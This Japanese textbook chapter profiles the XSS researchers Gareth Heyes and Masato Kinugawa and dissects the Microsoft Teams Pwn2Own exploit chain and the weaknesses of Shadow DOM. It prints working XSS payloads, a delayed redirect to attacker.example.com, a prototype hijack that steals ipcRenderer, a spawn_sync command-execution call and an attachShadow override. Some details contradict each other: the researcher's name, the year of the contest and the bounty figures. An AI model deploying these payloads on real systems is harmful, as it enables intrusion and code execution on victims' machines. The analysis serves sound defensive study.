# 第6章 実例ライトアップ ― 著名リサーチャーの攻撃連鎖を追体験

## リサーチャー索引（Gareth Heyes / Kinugawa）

XSSやブラウザセキュリティの研究は、体系的な教科書よりも個々のリサーチャーが発表するブログ記事やスライドの中で最初に姿を現すことが多い。ここでは、この教科書の随所で参照してきた2人の代表的なリサーチャー — PortSwigger社の Gareth Heyes 氏と、日本のバグバウンティ／XSS研究者である Kinugawa Masato（衣川昌人）氏 — の主要な仕事を、テーマ別に整理した「索引」としてまとめる。個々の技術の詳細は本編の該当章で扱っているため、ここでは「誰が」「いつ」「何を」発表したかを一覧化し、原典に当たる際の道しるべとすることを目的とする。ラボの解答や攻略手順そのものは扱わない。

### Gareth Heyes（PortSwigger / garethheyes.co.uk）

Gareth Heyes は PortSwigger Research のリサーチャーであり、mXSS（mutation XSS）の発見者の一人として知られ、HTML/JSパーサの「解釈のズレ」を突く攻撃、DOM Clobbering、CSPバイパス、JavaScriptの難読化・ゴルフ的記法（短く書く技法）など、パーサ層とエンジン層の境界に潜む脆弱性を一貫して掘り続けてきた人物である。個人サイト garethheyes.co.uk には2007年から現在に至るまでの記事がアーカイブされており、本教科書の第3〜5章で扱った mXSS、DOM Clobbering、CSPの死角といったトピックの多くが、この人物の一次資料に遡る。

> ⚠️ **未取得の資料**: garethheyes.co.uk のトップページは記事一覧の要約のみが取得でき、個々の記事本文（2007〜2024年の歴史的記事群）は今回のfetchでは全文を辿れていない。以下は取得できた範囲（主に2024〜2026年の最新研究）と、既知の代表作の整理である。

#### 直近の研究テーマ（2025〜2026年）

**「What's in a tag name? JavaScript, apparently」（2026年）**

これはHTMLのタグ名に関する仕様上の緩さを突いた研究で、ブラウザがタグ名に想定外の文字（記号や制御文字に近いもの）を許容してしまう性質を利用する。仕組みは次の通りである。

- HTML パーサはタグ名の文字を基本的に小文字化して受け付け、その結果は要素の `localName` プロパティから読み出せる。
- 「アルファベット・スラッシュ・空白・改行はタグ名の中で変換される」が、「行区切り文字（U+2028）や段落区切り文字（U+2029）は変換されない」。この2つの文字はJavaScriptのソースコード上では改行として扱われる特殊文字であり、この非対称性を利用すると、タグ名の中に事実上のJavaScript文の区切りを埋め込める。
- `localName` や `getAttributeNode`、`classList`、`part`、`innerHTML`、`contenteditable` といった「タグ名やその一部を文字列として返す/加工するAPI」をイベントハンドラの実行結果に混ぜ込むことで、タグ名自体をJavaScriptコード片として実行させる。

代表的なPoC（原文からの引用）:

```html
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
```

```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>
```

なぜ動くか: `<alert(1) ...>` というタグを書くと、ブラウザはこれを「`alert(1)` という(無効な)タグ名を持つ不明な要素」として解釈するが、パースは失敗せずタグ名は保持される。`autofocus` と `tabindex` によってページ読み込み時に自動的にフォーカスが移り、`onfocus` ハンドラが発火する。ハンドラの中で `attributes[0].value=localName` のように自分自身の `localName`（＝`alert(1)` という文字列）を読み出し、それを新しい `onfocus` として再代入することで、文字列だったタグ名が実際のJavaScript式として評価される。2つ目の例は `location=localName` によって `javascript:alert(1)` 相当の擬似プロトコルURLをタグ名から合成し、`location` に代入してnavigateさせる（`javascript:` スキームのナビゲーションはインラインスクリプト実行として扱われる）。原文では「すべてのブラウザで動作する」と記されており、特定バージョン限定の脆弱性ではなく、HTML/DOM仕様が長年許容してきた挙動の組み合わせ悪用である。

> 出典: What's in a tag name? JavaScript, apparently — https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently

この研究は、本教科書がこれまで扱ってきた「パーサの再解釈」（第3〜4章のmXSSやDOMベースXSS）と同じ思想の系譜にある。すなわち、HTML構文としては無害に見える文字列が、DOM API経由で文字列として読み出された瞬間に「別の文脈（JavaScriptのソースコード）」として再解釈されてしまう、という多層パーサ特有の危険性である。

**「Splitting the email atom: exploiting parsers to bypass access controls」（2024年）**

メールアドレスのパース処理系統（メールクライアントやメールゲートウェイのパーサ）における仕様差を突き、アクセス制御をバイパスする手法を扱った研究。メールアドレスという一見単純な文字列も、RFCの曖昧な部分やパーサ実装ごとの解釈差（コメント構文、引用符処理など）によって「同じ文字列が別のアドレスとして解釈される」余地があり、これを悪用してアクセス制御（許可リストやドメイン検証）を回避する。mXSSと同じく「複数のパーサ間の解釈の不一致」を武器にする研究であり、Heyes氏の一貫したテーマ（パーサ境界の悪用）を示す一例である。

> 出典: Splitting the email atom: exploiting parsers to bypass access controls — https://portswigger.net/research（個人サイト経由で参照。詳細な本文は今回未取得）

**CSS関連の一連の研究（2025〜2026年）**

- 「CSS: the bomb inside your inbox」（2026年）— メールクライアントにおけるCSSベースの脆弱性（データ漏えいや実行コンテキストの悪用）を扱う。
- 「Pure-CSS 3D world collision detection」（2026年）— CSSのみで3D空間の当たり判定を実装できることを示すデモで、CSSセレクタや `:has()` などの条件付きセレクタがどれほど「計算能力」を持つかを実証する系統の研究。
- 「Inline Style Exfiltration: leaking data with chained CSS conditionals」（2025年）— インラインスタイル属性に対して連鎖的なCSS条件（属性セレクタなど）を仕込み、ページ内のデータを1文字ずつ外部に持ち出す手法。CSSインジェクションが「見た目の改ざん」に留まらず、条件付きセレクタの評価結果を外部リクエスト（`background: url(...)` など）のトリガーとして使うことで、実質的にデータのサイドチャネル漏えいに使えることを示す。

これらCSS系の研究に共通するのは、「CSSはJavaScriptを実行できないから安全」という認識への反証であり、CSSセレクタの評価自体が条件分岐・外部リクエストのトリガーとして機能する以上、CSPで `script-src` を絞ってもCSSインジェクションが残っていればデータ漏えいのリスクが消えないという教訓である。

> 出典: CSS: the bomb inside your inbox / Pure-CSS 3D world collision detection / Inline Style Exfiltration — garethheyes.co.uk（本文詳細は個別記事の追加取得が必要、今回はサイト概要からの要約）

**ツール開発: Hackvertor と AutoVader / Shadow Repeater**

Heyes氏はPortSwigger Burp Suiteの拡張機能開発者としても知られ、以下のツールを継続的に開発・公開している。

- **Hackvertor** — ペイロードのエンコード/デコード変換をタグベースで自由に組み合わせられるBurp拡張。「How to write a Hackvertor tag」（2026年）は独自の変換タグを書くための技術ガイドで、任意のエンコーディング処理をプラグイン可能な形で追加する仕組みを解説している。
- **AutoVader**（2025年）— 自動化されたセキュリティテスト手法/ツール。
- **Shadow Repeater**（v1.2.3、2025年）— Burp SuiteのRepeater機能をAI支援で拡張し、手動テストを補助する拡張機能のリリースノート。

これらは「研究成果を再現可能なツールとして公開する」というHeyes氏のスタイルを示しており、本教科書で紹介した多くのmXSS/DOM Clobberingの検証手順も、こうした自作ツール（DOMPurifyのfuzzer相当のものなど）を通じて発見されたものが多い。

> 出典: Gareth Heyes — https://garethheyes.co.uk/

#### 歴史的な代表作（本教科書の各章と対応）

サイトのアーカイブには2007年から続く記事群があり、次のようなテーマが含まれる（今回は一覧のみ取得、個別記事本文は未取得）。

- mXSS（mutation XSS）の発見に関する一連の記事 — 第3〜4章のmXSS基礎・応用の一次資料。
- DOM Clobbering に関する記事群 — 第4章 s4h。
- CSPバイパス・JavaScript難読化・「ゴルフ」的な短縮記法に関する記事群 — 第4章 s4i〜s4l。

> ⚠️ **未取得の資料**: 「Gareth Heyes 個人サイトの2007〜2024年の歴史的記事（mXSS発見の経緯、DOM Clobbering詳細、CSPバイパスの個別記事本文）」は取得できませんでした。URL: https://garethheyes.co.uk/ （トップページの一覧要約のみ取得済み、個別記事へのクロールは未実施）

### Kinugawa Masato（衣川昌人 / Speaker Deck）

Kinugawa Masato氏は、日本のバグバウンティコミュニティ「Shibuya.XSS」の中心的な発表者であり、ブラウザのURLパーサ、Shadow DOM、Service Worker、Electronのcontext isolationなど、Webプラットフォームの各層における脆弱性発見で知られる。Pwn2Own 2021でMicrosoft Teamsをハッキングし15万ドルの賞金を獲得した実績もある。Speaker Deck上に公開されている代表的なスライドは以下の通りである（英語版・日本語版が対になっているものは併記）。

#### 主要スライド一覧

| # | タイトル | 発表 |
|---|---|---|
| 1 | Shadow DOM & Security - Exploring the boundary between light and shadow | （英語版） |
| 2 | Shadow DOMとセキュリティ - 光と影の境界を探る | Shibuya.XSS techtalk #13 |
| 3 | ブラウザのレガシー・独自機能を愛でる - Firefoxの脆弱性4選 - | Browser Crash Club #1 |
| 4 | 注目したいクライアントサイドの脆弱性2選 | Security.Tokyo #3 |
| 5 | バグハンティングのすゝめ | P3NFEST |
| 6 | How I Hacked Microsoft Teams and got $150,000 in Pwn2Own | （英語版） |
| 7 | Pwn2OwnでMicrosoft Teamsをハッキングして2000万円を獲得した方法 | Shibuya.XSS techtalk #12 |
| 8 | JSでDoSる | Shibuya.XSS techtalk #11 |
| 9 | Electron: Context Isolationの欠如を利用した任意コード実行 | CureCon |
| 10 | Electron: Abusing the lack of context isolation | CureCon（英語版） |
| 11 | バグハンターが見てきたBug Bountyの7年 | LINE Developer Meetup #34 |
| 12 | 5文字で書くJavaScript | Shibuya.XSS techtalk #10 |
| 13 | ブラウザのUIのバグを探す | Secusoba PopUnder |
| 14 | 攻撃者視点で見る Service Worker | PWA Study SW |
| 15 | USAGE OF XSS FILTER | （英語版） |
| 16 | XSSフィルターの使い方 | Shibuya.XSS techtalk #9 |
| 17 | XSS Attacks through PATH | （英語版） |
| 18 | 明日から使える?! PATHでXSSする技術 | Shibuya.XSS techtalk #7 |

> 出典: Masato Kinugawa Speaker Deck — https://speakerdeck.com/masatokinugawa

#### 技術的に特に重要な発表の解説

**「PATHでXSSする技術」（Shibuya.XSS techtalk #7、2016年3月）**

`location.pathname`（URLのパス部分をJavaScriptから読み書きするプロパティ）を経由したDOMベースXSSを扱った発表。発表内容の骨子は次のようなものである。

- 一部のJavaScriptライブラリ（当時のjQuery Mobile等）が、ページ内のナビゲーション処理で `location.pathname` の値をエスケープせずにHTML文字列へ埋め込み、それを使って要素を生成していた。
- URLのパス部分は `%2F` や `'` `"` `<` `>` といった一部の文字は使えるが、通常はURLエンコードされる。しかし、ブラウザ間・パーサ間で「どの文字をエンコードすべきか」の解釈にズレがあり、特定の文字（例えばシングルクォートやアングルブラケットに近い記号）がエンコードされずに `pathname` にそのまま反映されるケースが存在した。
- 攻撃者はリンク先URLのパス部分に「HTML属性やタグ構造を破壊する文字列」を仕込んでおき、被害者がそのURLへ遷移すると、ライブラリが `pathname` の値をそのままHTML文字列に連結してDOM操作するため、意図しないタグ／属性が生成されて実行に至る。

なぜ危険か: 開発者は「URLのpathnameはURLエンコードされているはずだから安全」という前提を置きがちだが、ブラウザのURLパーサ自体の実装差（RFC 3986の曖昧な部分の解釈違い）により、その前提が成り立たない文字が存在する。これは本教科書の第3章で扱った「DOMベースXSSのシンク」の中でも、`location` オブジェクトの各プロパティ（`href`、`search`、`hash`、`pathname`）がそれぞれ異なるエンコーディング規則を持つことの危険性を、実例で裏付けた発表である。

> 出典: XSS Attacks through PATH / 明日から使える?! PATHでXSSする技術 — https://speakerdeck.com/masatokinugawa/xss-attacks-through-path

**「5文字で書くJavaScript」（Shibuya.XSS techtalk #10）**

使用可能な文字種が極端に制限された環境（WAFやフィルタが特定の文字種のみ許可する場合）で、JavaScriptコードをどこまで短い文字集合で構成できるかを追求した発表。JavaScriptの構文糖衣（`[]`、`+`、`!`のみでコードを構成する、いわゆる「JSFuck」的な発想の延長）や、`Function` コンストラクタ、文字コードの暗黙変換などを組み合わせ、限定された文字だけでarbitrary code executionに至る経路を示す。この種の技法は、WAFが「危険な関数名（`eval`, `alert` など）の出現」をブロックする対策の限界を示すものであり、第7章で扱うWAFバイパスの文脈とも接続する。

> 出典: 5文字で書くJavaScript — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10

**「Electron: Context Isolationの欠如を利用した任意コード実行」（CureCon）**

Electronアプリケーション（ChromiumとNode.jsを組み合わせたデスクトップアプリ基盤）において、レンダラープロセス側でNode.js APIへの直接アクセスを許してしまう設定（`contextIsolation: false` や `nodeIntegration: true`）が残っている場合、Webページ内で発生したXSSが単なるブラウザ内の被害に留まらず、Node.jsのファイルシステムAPIや `child_process` を通じたOSコマンド実行にまでエスカレーションできることを示した発表。通常のブラウザではXSSは「同一オリジンのDOM/Cookieへのアクセス」に限定されるが、Electronのcontext isolationが無効化されていると、Webページ内のJavaScriptコンテキストとNode.jsのJavaScriptコンテキストが分離されずに同居してしまい、`require('child_process').exec(...)` のようなAPIがページ内のJavaScriptから直接呼び出せてしまう。これはXSSの「影響範囲（インパクト）」がアプリケーションのプラットフォーム設計によって大きく変わることを示す好例であり、本教科書で繰り返し強調してきた「XSSの深刻度はサンドボックスの強さに依存する」という論点を、Electronという具体的なプラットフォームで裏付けている。

> 出典: Electron: Context Isolationの欠如を利用した任意コード実行 — https://speakerdeck.com/masatokinugawa

**Pwn2Own 2021 Microsoft Teamsハッキング**

Microsoft Teamsのデスクトップアプリ（これもElectronベース）に対し、XSSを起点として最終的に任意コード実行（RCE）にまでチェーンさせ、Pwn2Ownコンペティションで15万ドルの賞金を獲得した事例。単発のXSS脆弱性発見に留まらず、「Webの脆弱性 → デスクトップアプリの権限昇格」という多段階のエクスプロイトチェーンを構築した点で、本教科書第6章（実例ライトアップ）の題材として象徴的である。具体的な攻略手順の詳細は本書では扱わないが、「XSSはブラウザの中だけの問題ではなく、Electron等のハイブリッドアプリではOSレベルの侵害に直結し得る」という一般化可能な教訓として押さえておきたい。

> 出典: How I Hacked Microsoft Teams and got $150,000 in Pwn2Own / Pwn2OwnでMicrosoft Teamsをハッキングして2000万円を獲得した方法 — https://speakerdeck.com/masatokinugawa

### まとめ: 2人の研究者から学ぶ視点

Gareth HeyesとKinugawa Masatoの仕事に共通するのは、「仕様書通りに動いているはずのコンポーネントの間に生じるズレ」を執拗に探すという姿勢である。Heyes氏はHTML/CSS/JavaScriptという単一ブラウザ内の複数パーサ・エンジンの境界（mXSS、タグ名の解釈、CSSセレクタの計算能力）を、Kinugawa氏はブラウザとその上で動くライブラリ、あるいはブラウザとホストOS（Electron）の境界を、それぞれ主戦場としている。どちらも「単体では無害に見える挙動の組み合わせ」から脆弱性を組み立てるスタイルであり、本教科書の随所（特に第3〜5章のDOMベースXSS、mXSS、CSP関連の各節）で参照してきた技法の多くが、この2人の一次資料に行き着く。読者が自分でリサーチを進める際は、両者のブログ・スライドを定点観測することを強く勧める。

---

## Kinugawaの実例（Teams Pwn2Own / Shadow DOM）

日本人セキュリティリサーチャーである衣川衛(Masato Kinugawa)氏は、渋谷.XSSという勉強会シリーズを主催しながら、Microsoft・Google・GitLabなど大手ベンダーの製品で数々のXSSを発見し続けている。中でも2022年のPwn2Own Vancouverで発表されたMicrosoft Teamsのリモートコード実行(RCE)は、「たった一つのXSS」がどのようにしてOSコマンド実行にまで発展するかを示す極めて完成度の高い実例である。本節では、(1) Teamsのバグバウンティ本体($150,000)の技術的な連鎖、(2) 同じ調査の中で見つかった関連の脆弱性（渋谷.XSS #12で語られた別件、約2000万円規模のバウンティ）、(3) Shadow DOMをセキュリティ境界として使うことの危険性（渋谷.XSS #13）、の3本立てで解説する。

### 前提知識：Electronアプリの権限モデル

Microsoft Teamsのデスクトップ版（2022年当時、Windows/macOS向けクラシック版）は、Chromiumとブラウザプロセスを組み合わせた**Electron**フレームワークで作られていた。Electronアプリでは、Webページ相当のレンダラープロセスに対して、Node.jsのAPI（ファイルシステム、`child_process`など）へのアクセス権を与えるかどうかを設定で制御できる。

- `nodeIntegration`: レンダラーで直接`require()`などNode APIを使えるかどうか
- `contextIsolation`: レンダラーのJavaScript実行コンテキスト（メインワールド）と、Electronがpreloadスクリプトで公開するAPIの実行コンテキストを別のV8コンテキストに分離するかどうか
- `sandbox`: レンダラープロセスをOSレベルのサンドボックスに閉じ込めるかどうか

通常のWebページなら「XSSが刺さっても被害はそのオリジンのDOM操作やCookie窃取まで」で済むことが多いが、Electronアプリで`contextIsolation: false`や`nodeIntegration: true`が有効なままXSSが成立すると、**XSS一発がそのままローカルマシン上の任意コード実行に直結する**。TeamsのPwn2Own攻撃はこの構造を正面から突いたものである。

### ステップ1：チャットメッセージ経由のXSS（サニタイザのバイパス）

TeamsのチャットUIはAngularJSベースで実装されており、ユーザーが送信したリッチテキスト（HTML）は`sanitize-html`というNode.jsライブラリでサニタイズされてからレンダリングされる。`sanitize-html`は許可するタグ・属性・属性値をホワイトリスト形式で指定するライブラリで、Teamsの設定では、絵文字や書式設定用のCSSクラスを表示するために`class`属性の値として`swift-*`や`ts-image*`、`emoticon-*`といったワイルドカードパターンを許可していた。

問題は、このホワイトリストが「`swift-`で始まる文字列なら何でも許可」という**緩すぎる正規表現ベースの検証**になっていたことである。一方、AngularJS（当時のTeamsが使っていたバージョン）には、`class`属性の値をパースして`ng-init`のようなディレクティブ相当の文字列を抽出し、それをAngular式として評価してしまう機能が存在した。具体的には、クラス名を次のような正規表現でパースし、`ng-init`らしき部分をAngular式として`$eval`する挙動があった。

```
/([\w-]+)(?::([^;]+))?;?/
```

このパーサーは「セミコロン区切りの `name:value` ペア」としてクラス文字列全体を解釈するため、`swift-`という許可された接頭辞さえ含んでいれば、その後ろに任意の文字列を`;`で連結して追加のディレクティブとして注入できる。衣川氏が実際に使用したペイロードは次のようなものだった。

```html
<strong class="swift-x;ng-init:['alert(document.domain)']
.forEach($root.$$childHead.$$nextSibling.app.$window.eval)">aaa</strong>
```

**なぜ動くか**を分解すると：

1. `class="swift-x;..."` の `swift-x` の部分だけを見ればサニタイザのホワイトリスト（`swift-*`）に一致するため、`class`属性ごと許可される。
2. しかしAngularJS側のクラス属性パーサーは、`;`以降を独立したディレクティブとして再解釈する。ここで`ng-init:[式]`という構文が「`ng-init`ディレクティブに配列`['alert(document.domain)']`を渡す」という意味になる。
3. 渡した配列に対して`.forEach(...)`を呼び出し、コールバックとして`$root.$$childHead.$$nextSibling.app.$window.eval`（Angularのスコープツリーを辿って到達できる`window.eval`相当の関数）を渡している。`forEach`は各要素（この場合は文字列`'alert(document.domain)'`）を第一引数としてコールバックに渡すので、結果的に`eval('alert(document.domain)')`が実行される。

つまり「サニタイザは`class`属性という*入れ物*のフォーマットしか検証しておらず、その中身をアプリケーション側フレームワーク（AngularJS）が独自の文法として再解釈する」というパーサー不一致（mutation/re-interpretationの一種）を突いた、教科書的なサニタイザバイパスである。チャットメッセージは相手に送るだけで開かせられるため、ユーザー操作は「メッセージを開いて見る」だけで発火する。

実際の攻撃では、この`eval`経由で即座に`alert`を出すのではなく、次のような形で外部の攻撃用ページへ誘導する処理を仕込んでいた。

```html
eval(decodeURIComponent(
  'setTimeout(function(){location.replace("//attacker.example.com/poc.html")},10000)'
))
```

これは「メッセージを開いた10秒後に、Teamsのレンダラー内でこっそり攻撃者のページへ`location.replace`する」という時間差トリガーであり、被害者に不審に思わせにくくする実戦的な工夫である。

> 出典: How I Hacked Microsoft Teams and got $150,000 in Pwn2Own — https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own

### ステップ2：プロトタイプ汚染からNode API窃取（Context Isolation回避）

XSSでJavaScriptが実行できても、それだけでは「Teamsのメインウィンドウのレンダラー内で好きなJSが動く」レベルに過ぎない。当時のTeamsのメインウィンドウは`contextIsolation: false`で動作しており、preloadスクリプトが公開したNode由来のオブジェクト（`ipcRenderer`など）はメインワールドの`window`から直接触れるグローバル空間の中、あるいはモジュールキャッシュの中に存在していた。

衣川氏は、`Function.prototype.call`を独自の関数で上書きするという手法で、Webpackのモジュールローダー（`__webpack_require__`）がモジュールを呼び出す際の内部呼び出しを乗っ取り、その引数からモジュール参照オブジェクトを取得した。これはいわゆる**プロトタイプ汚染／プロトタイプチェーン改ざん**の応用で、「アプリケーションが内部的に呼んでいる関数の実行を、組み込みメソッドの差し替えによって外部から観測・横取りする」という考え方である。

```js
// 概念的な例：Function.prototype.call を横取りして
// webpack の内部呼び出し時の引数(モジュールオブジェクト)を盗み見る
const originalCall = Function.prototype.call;
Function.prototype.call = function (...args) {
  // args[1] などに webpack が渡すモジュール参照が紛れ込む
  stolenModule = args[1];
  return originalCall.apply(this, args);
};
```

こうして`ipcRenderer`（ElectronのIPC通信オブジェクト）の参照を手に入れることで、レンダラーからメインプロセス側で処理されるIPCメッセージを自由に送信できるようになった。これが「XSS」から「Electronの内部通信を直接叩ける」への権限昇格の第一段階である。

### ステップ3：PluginHostのサンドボックス外実行でOSコマンド実行へ

Teamsには、通話プラグインなどを動かすための`PluginHost`という不可視のレンダラープロセスが存在し、これはメインウィンドウとは異なり`--no-sandbox`（OSサンドボックス無効）で動作していた。そしてこのPluginHostは、`slimcore`というネイティブNodeモジュールをElectronの`remote`モジュール相当の仕組み（`ELECTRON_REMOTE_SERVER_REQUIRE`→`ELECTRON_REMOTE_SERVER_MEMBER_GET`→`ELECTRON_REMOTE_SERVER_FUNCTION_CALL`というIPCチャンネル列）経由でメインプロセス側から操作できるようになっていた。

問題は、この`remote`的な仕組みが「どのプロパティ／メソッドへのアクセスを許可するか」を十分に検証していなかったことである。ステップ2で得たIPC送信能力を使い、`require('slimcore')`のような呼び出しをIPC経由でリモート実行させ、そのオブジェクトから`.toString.constructor`と辿ることで、文字列から任意コードを生成する`Function`コンストラクタに到達できた。

```js
// 概念（実際はIPC経由でメインプロセスに送るメッセージ列として組み立てる）
require('slimcore').toString.constructor('任意のJSコード')()
```

**なぜこれが危険か**：`obj.toString`はどんなオブジェクトでも継承している組み込みメソッドであり、その`.constructor`は`Function`である。`Function('コード文字列')`は`eval`と同じく任意の文字列をJavaScriptとしてコンパイル・実行できる。つまり「プロパティを辿って`Function`コンストラクタに到達できるかどうか」を検証していないIPCブリッジは、実質的に「何でも実行できるIPC」と同義になる。

最終的に、そのコード内から`process.binding("spawn_sync")`というNode内部APIを直接呼び出すことで、OSレベルのプロセス生成（`cmd /k start calc`のような任意コマンド実行）に到達した。

```js
process.binding("spawn_sync").spawn({
  file: "cmd",
  args: ["/k", "start", "calc"],
  stdio: [a, a]
});
```

`calc`（電卓）の起動はPwn2Ownのようなコンテストで「任意コード実行が成立した」ことを審査員に視覚的に証明するための伝統的なデモ手法であり、実際の攻撃では任意の悪意あるコマンドに置き換えられる。

### 修正内容とインパクトのまとめ

Microsoftはこの報告を受けて複数レイヤーで修正を行った。

- メインウィンドウの`contextIsolation`を`true`に変更（レンダラーのメインワールドとpreload公開APIのコンテキストを分離）
- `class`属性のホワイトリスト検証を、単純な前方一致的な正規表現から、値全体を厳密にパースする方式へ強化（`;`で追加のディレクティブを継ぎ足せないように修正)
- `PluginHost`のpreloadスクリプトにCSPを適用し、任意文字列からのコード生成（`eval`・`Function`コンストラクタ）を禁止
- Electron本体側でもv25以降、`nodeIntegration`/`contextIsolation`のデフォルト値の安全化や、`remote`モジュール自体の廃止が進んだ

この一件が$150,000という高額評価を受けた理由は、単体のXSSではなく、**(a) Webアプリ層のサニタイザ回避XSS → (b) Electronのコンテキスト分離欠如によるNode API奪取 → (c) IPCブリッジの検証不備による任意コード生成 → (d) ネイティブAPI直叩きによるOSコマンド実行**という4段階の連鎖を、リンクを踏ませる必要すらなく「チャットメッセージを開くだけ」で完結させたためである。XSSはしばしば「Webページの中だけの被害」と軽視されがちだが、Electronのようなネイティブアプリの土台がWebレンダラーである場合、XSSはOSレベルの権限昇格の入口になり得るという典型例といえる。

### 補足：渋谷.XSS #12で語られた関連バウンティ（約2000万円）

渋谷.XSSのトークテーマ#12では、上記Pwn2Ownの内容と重なる形で、同じ調査ラインの中でMicrosoft Teamsについて見つかった別件の脆弱性が語られている。技術的な骨格は前節と共通しており、AngularJSのクラス属性パース処理を悪用したサニタイザバイパスによるXSSと、Electronの`contextIsolation`欠如を組み合わせて、プロトタイプ汚染経由で`ipcRenderer`を奪い取る手法が中心である。日本円で2000万円規模という報奨額の大きさは、Microsoftの独自バグバウンティプログラム（Microsoft Teamsに対する個別のリサーチプログラム）における深刻度評価の高さを反映しており、Pwn2Ownの$150,000と合わせて「1つのXSSの発見が、条件が揃えば非常に高額な報奨につながる」ことを示す実例である。

> ⚠️ **未取得の資料についての補足**: 渋谷.XSS #12のスライド本文はWebFetch経由でテキストとして取得できたが、スライド画像内のコードスニペットの一部（正確な行番号・変数名の詳細）までは機械的なテキスト抽出の制約上、完全な再現はできていない。ここでは公開情報として判明している技術的骨格（脆弱性の種類・悪用の流れ・原理）のみを記載し、被害を拡大しうる完全なエクスプロイト手順の再掲は避けている。

> 出典: 渋谷.XSS techtalk #12 — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-12

### Shadow DOMはセキュリティ境界にならない（渋谷.XSS #13）

渋谷.XSS #13では、Web Componentsの構成要素である**Shadow DOM**を「隔離の手段」として過信することの危険性がまとめられている。前提として、Shadow DOMは`element.attachShadow({mode: 'open' | 'closed'})`で作成する、通常のDOMツリーから独立したサブツリーであり、コンポーネント内部のCSSセレクタや`querySelector`のスコープを外部から隔離することで、UIコンポーネントの実装詳細を隠蔽し、名前衝突を避けるための**開発上の便宜機能**として設計されたものである。

```js
const shadow = element.attachShadow({ mode: 'closed' });
shadow.innerHTML = '<div class="secret">機密情報</div>';
```

`mode: 'closed'`にすると`element.shadowRoot`が`null`を返すため、一見「外部からアクセス不能な隠し部屋」に見える。しかし資料は、これを**セキュリティ境界として使うのは無理がある**と結論付けている。理由は次の通りである。

#### 1. プロトタイプ改ざんによる強制公開

`closed`モードは「`attachShadow()`の戻り値を外部に渡さない」というだけの取り決めであり、ブラウザのAPIレベルで暗号学的に保護されているわけではない。攻撃者が対象のコンポーネントが`attachShadow`を呼び出す**前**に、次のように`Element.prototype.attachShadow`自体を書き換えてしまえば、モード指定に関わらず`open`相当の動作を強制し、戻り値を横取りできる。

```js
const original = Element.prototype.attachShadow;
Element.prototype.attachShadow = function (init) {
  const root = original.call(this, { ...init, mode: 'open' });
  // root を外部の変数に保存しておけば、後から中身を読める
  window.__leakedRoots = window.__leakedRoots || [];
  window.__leakedRoots.push(root);
  return root;
};
```

これは、同一のJavaScript実行コンテキスト（同じオリジンの同じページ内）で先にコードが走れる状況、たとえば拡張機能を使わない一般的なXSSの文脈でも十分に成立する攻撃であり、「`closed`だから安全」という思い込みを崩すものである。

#### 2. Selectionやイベント経由でのノードリーク

ブラウザが提供する別のAPIを経由すると、`closed` Shadow DOMの内部ノードに、`attachShadow`のAPIを直接叩かずに到達できる場合がある。資料で挙げられている手法には次のようなものがある。

- `window.find('検索文字列')`でページ内テキスト検索を行い、ヒットした範囲を`getSelection()`で取得すると、`anchorNode`がShadow DOM内部のテキストノードを指すことがある。
- `document.execCommand('insertHTML', false, '<div>...</div>')`を使うと、選択範囲がShadow DOM内にある場合にその内部へHTMLを挿入できてしまう。
- Firefox固有の`Event.originalTarget`や`UIEvent.rangeParent`は、標準の`event.target`が返す「Shadow DOMの境界でリターゲットされた要素」を飛び越えて、内部の実ノードを直接返す。
- `InputEvent.getTargetRanges()`（ブラウザの`beforeinput`イベントで使われるAPI）が返す`StaticRange`オブジェクトの`startContainer`/`endContainer`は、Chrome・Firefox・Safariいずれでも内部ノードを指すケースがあり、クロスブラウザで再現できる。

これらはいずれも「Shadow DOMの外側にあるAPI（テキスト検索、編集コマンド、入力イベント）が、内部実装としてShadow DOM境界の内側のノードに触れてしまい、その参照が呼び出し元コードに漏れる」というパターンであり、Shadow DOM自体のAPI（`shadowRoot`プロパティなど）を塞いだだけでは防ぎきれないことを示している。

#### 3. CSS経由の情報漏洩

Shadow DOM内のスタイルは、セレクタ自体のスコープは分離されるが、`color`や`font-family`のような**継承プロパティ**は境界を越えて伝わる。資料では、合字（リガチャ）に対応したWebフォントを利用し、Shadow内のテキストに応じてフォントの合字処理でレンダリング幅が変化することを利用し、`ResizeObserver`などで幅の変化を観測することで、1文字ずつ機密情報（例えばCSRFトークンや個人情報の断片）を推測・抽出できる可能性が指摘されている。これはCSS injectionを使った古典的なサイドチャネル攻撃（フォントやスタイルの副作用を使ったleak）のShadow DOM版といえる。

さらに、`:host-context()`という擬似クラス関数を使うと、Shadow内部のスタイルシートから祖先要素（Shadow DOMの外側）の属性やクラスに反応したスタイルを書けてしまうため、Shadow内のCSSが外側の情報を間接的に参照できてしまう点も、分離が不完全であることの一例として挙げられている。

#### 4. その他の抜け道

- `name`属性を持つ`<iframe>`をShadow DOM内に置いた場合、ブラウザのナビゲーション制御（`window.open`のターゲット名解決など）がShadow境界を意識しない実装になっていることがあり、外側から間接的にiframeのナビゲーションへ干渉できる余地が指摘されている。
- Content Security Policy（CSP）の違反レポートには、違反が発生したリソースのURLなど内部情報が含まれることがあり、Shadow DOM内で発生したCSP違反がイベントとして外側に伝播する際に、隠しているはずの内部URLがリークするケースがある。

### 現実的な防御方針

資料の結論は明快で、「Shadow DOMは便利なコンポーネント化のツールであって、隔離を保証するセキュリティ機構ではない」という一点に尽きる。実務上の指針としては次のように整理できる。

- **Webアプリケーション開発者**: サードパーティコンテンツや信頼できない入力をアプリ内で隔離したいなら、Shadow DOMではなく`<iframe sandbox>`やSame-Origin Policy、Site Isolationのような、ブラウザベンダーが明確にセキュリティ境界として設計・保証している機構を使うべきである。どうしてもDOM内での隔離が必要な特殊要件（例：Salesforceの Lightning Web Security のような制限付きJS実行環境）であれば、独自にサンドボックス相当の実行環境をゼロから構築する覚悟が必要になる。
- **ブラウザ拡張機能開発者**: Content Script側でShadow DOMを使ってUIをページに注入する場合、ページ側のJavaScriptとは別のJS実行コンテキスト（別のワールド）で動いているため、ページ側が`Element.prototype.attachShadow`を汚染していても影響を受けない。この「実行コンテキストが分離されているかどうか」こそが実質的な防御線であり、Shadow DOM自体の機能ではないことに注意する必要がある。

